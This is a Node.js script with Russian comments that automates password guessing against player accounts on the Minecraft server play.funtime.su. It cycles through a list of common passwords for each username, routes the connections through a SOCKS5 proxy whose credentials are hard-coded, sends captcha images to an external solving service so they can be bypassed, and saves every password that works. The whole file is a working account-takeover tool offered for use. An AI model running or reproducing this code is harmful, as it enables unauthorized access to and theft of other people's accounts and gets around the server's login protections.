const mineflayer = require('mineflayer');
const FlayerCaptcha = require('FlayerCaptcha');
const fs = require('fs-extra');
const { keyAPI } = require('./setting');
const { commonPasswords } = require('./acc');
let { SocksClient: socks } = require('socks');
let crypto = require('crypto');
const { resolve } = require('path');

// --- ЛОГИКА НАПРАВЛЕНИЙ ---
const captchaDir = resolve(process.cwd(), 'captcha');
const directions = new Map([
    ['3 2', 'up'], ['3 -2', 'down'], ['3 0', 'south'],
    ['2 0', 'west'], ['0 0', 'north'], ['5 0', 'east'],
]);
const directions2 = { 'up': 'down', 'down': 'up', 'south': 'north', 'west': 'east', 'north': 'south', 'east': 'west' };

function getViewDirection(yaw, pitch) {
    const key = `${Math.round(yaw)} ${Math.round(pitch)}`;
    return directions2[directions.get(key)];
}

let accounts = [];

async function manageAccounts(action) {
    if (action === 'load') {
        try {
            accounts = await fs.readJson('accounts.json');
        } catch (e) { console.log('🐱‍💻 ОШИБКА ЗАГРУЗКИ JSON 🐱‍💻', e); }
    }
    if (action === 'save') {
        try {
            await fs.writeJson('accounts.json', accounts, { spaces: 2 });
        } catch (e) { console.log('🐱‍💻 ОШИБКА СОХРАНЕНИЯ JSON 🐱‍💻', e); }
    }
}

async function joni3(indexAcc, indexPass) {
    if (indexAcc >= accounts.length) {
        console.log("🎯 Все аккаунты из списка обработаны!");
        return;
    }
    if (indexPass >= commonPasswords.length) {
        console.log(`❌ Пароли закончились для ${accounts[indexAcc].username}.`);
        setTimeout(() => joni3(indexAcc + 1, 0), 50000);
        return;
    }

    const currentAcc = accounts[indexAcc];
    if (currentAcc.done) return joni3(indexAcc + 1, 0);

    // --- ОБЪЯВЛЯЕМ ПЕРЕМЕННЫЕ ТАЙМЕРОВ ЗАРАНЕЕ ---
    let isFinished = false; 
    let loginResponseTimeout = null;
    let globalTimeout = null; 
    let bot; 

    // Функция для безопасного перезахода
    const reconnectWithDelay = (nextAcc, nextPass, reason) => {
        if (isFinished) return;
        isFinished = true;
        
        console.log(`⏳ [ПАУЗА 60с] Причина: ${reason}. Ждем перед следующим входом...`);
        
        if (globalTimeout) clearTimeout(globalTimeout);
        if (loginResponseTimeout) clearTimeout(loginResponseTimeout);
        
        if (bot) {
            bot.removeAllListeners(); // Очищаем слушателей, чтобы не было утечек
            bot.end();
        }

        setTimeout(async () => {
            try {
                await joni3(nextAcc, nextPass);
            } catch (e) { console.log("🐱‍💻 ОШИБКА РЕКУРСИИ 🐱‍💻", e); }
        }, 60000); 
    };

    try {
        console.log(`\n🚀 ПОПЫТКА: ${currentAcc.username} | Пароль: [${commonPasswords[indexPass]}] (№${indexPass})`);
        
        bot = mineflayer.createBot({
            host: 'play.funtime.su',
            username: currentAcc.username,
            version: '1.20',
            hideErrors: true,
            connect: (client) => {
                socks.createConnection({
                    proxy: {
                        host: `38.225.2.139`, port: 5922, type: 5,
                        userId: `hyqatyqe`, password: `2p5v5o0b51zq`
                    },
                    command: 'connect',
                    destination: { host: 'play.funtime.su', port: 25565 },
                }, (err, info) => {
                    if (err) return;
                    client.setSocket(info.socket);
                    client.emit('connect');
                });
            }
        });

        const captcha = new FlayerCaptcha(bot);

        // Теперь переменная доступна для reconnectWithDelay
        globalTimeout = setTimeout(() => {
            reconnectWithDelay(indexAcc, indexPass + 1, "Глобальный таймаут (30с)");
        }, 30000);

        captcha.on('imageReady', async ({ data, image }) => {
            if (isFinished) return;
            const viewDirection = data.viewDirection;
            if (getViewDirection(bot.entity.yaw, bot.entity.pitch) != viewDirection) return;

            const outputPath = resolve(captchaDir, `captcha_${crypto.randomBytes(4).toString('hex')}.png`);
            try { await image.toFile(outputPath); } catch (e) { console.log(`🐱‍💻 ОШИБКА 9401 🐱‍💻`, e); }

            try {
                let rawResult = await sendAPI(outputPath);
                let solved = rawResult.replace(/^.*?(?=\d)/, '');
                bot.chat(`${solved}`);
                console.log(`🧩 Капча отправлена: ${solved}`);
            } catch (e) { console.log(`🐱‍💻 ОШИБКА 9402 🐱‍💻`, e); }
        });

        let loginSent = false;
        bot.on('message', async (message) => {
            if (isFinished) return;
            const text = message.toString();
            console.log(message.toAnsi())
            
            if (text.includes("Войдите в игру ↝ /login <Пароль>") && !loginSent) {
                loginSent = true;
                bot.chat(`/login ${commonPasswords[indexPass]}`);
                 bot.chat(`/login ${commonPasswords[indexPass]}`);
                  bot.chat(`/login ${commonPasswords[indexPass]}`);
                   bot.chat(`/login ${commonPasswords[indexPass]}`);
                    bot.chat(`/login ${commonPasswords[indexPass]}`);
                console.log(`📨 Команда отправлена. Ждем подтверждения 6с...`);

                loginResponseTimeout = setTimeout(() => {
                    reconnectWithDelay(indexAcc, indexPass + 1, "Пароль не подошел (6с вышло)");
                }, 6000);
            }

            if (text.includes("Успешная авторизация! Приятной игры!")) {
                isFinished = true;
                if (globalTimeout) clearTimeout(globalTimeout);
                if (loginResponseTimeout) clearTimeout(loginResponseTimeout);
                
                console.log(`✨ УСПЕХ! Аккаунт ${currentAcc.username} готов.`);
                
                accounts[indexAcc].password = commonPasswords[indexPass];
                accounts[indexAcc].done = true;

                try {
                    await manageAccounts('save');
                } catch (e) { console.log(`🐱‍💻 ОШИБКА 9403 🐱‍💻`, e); }

                bot.end();
                setTimeout(() => joni3(indexAcc + 1, 0), 2000);
            }
        });

        bot.on('kicked', (reason) => {
            reconnectWithDelay(indexAcc, indexPass + 1, `Кик: ${reason}`);
        });

        bot.on('error', (err) => { 
            if (err.code === 'ECONNREFUSED') {
                reconnectWithDelay(indexAcc, indexPass, "Ошибка прокси (ECONNREFUSED)");
            }
        });

    } catch (error) {
        console.log(`🐱‍💻 КРИТИЧЕСКАЯ ОШИБКА 🐱‍💻`, error);
        setTimeout(() => joni3(indexAcc, indexPass + 1), 60000);
    }
}

manageAccounts('load').then(() => {
    joni3(0, 0);
});









// --------------------------------------------------------------------------------
// ФУНКЦИЯ ВЗАИМОДЕЙСТВИЯ С ВНЕШНИМ API КАПЧИ
// --------------------------------------------------------------------------------
/**
 * Отправляет изображение капчи на внешний API для разгадывания и получает ответ.
 * @param {string} filePath Путь к файлу изображения капчи.
 * @returns {Promise<string>} Разгаданный текст капчи.
 */
async function sendAPI(filePath) {
    const site = "http://5.42.211.111"; // Адрес внешнего API

    try {
        // 1. Чтение файла и преобразование в Base64
        const base64Image = await fs.readFile(filePath).then(buffer => buffer.toString('base64'));

        // 2. Подготовка данных для POST-запроса (отправка капчи)
        const postData = new URLSearchParams({
            key: keyAPI,
            method: "base64",
            body: base64Image
        });

        // 3. Отправка POST-запроса
        const postResponse = await fetch(`${site}/in.php`, {
            method: "POST",
            body: postData
        });

        const postText = await postResponse.text();
        // Извлечение ID капчи из ответа API (например, OK|1234567)
        const captcha_id = postText.split("|")[1].split("\n")[0];

        // 4. Ожидание, пока API решит капчу
        await new Promise(resolve => setTimeout(resolve, 800));

        // 5. Подготовка данных для GET-запроса (получение результата)
        const getData = new URLSearchParams({
            key: keyAPI,
            action: "get",
            id: captcha_id
        });

        // 6. Отправка GET-запроса
        const getResponse = await fetch(`${site}/res.php?${getData}`);
        const getText = await getResponse.text();

        // 7. Извлечение ответа из полученного текста
        let answer = getText.split("|")[1].split("\n")[0] || getText.split("|")[1];

        return answer; // Возвращаем разгаданный ответ

    } catch (error) {
        console.error('API Error:', error);
        throw error; // Проброс ошибки для обработки выше
    }
}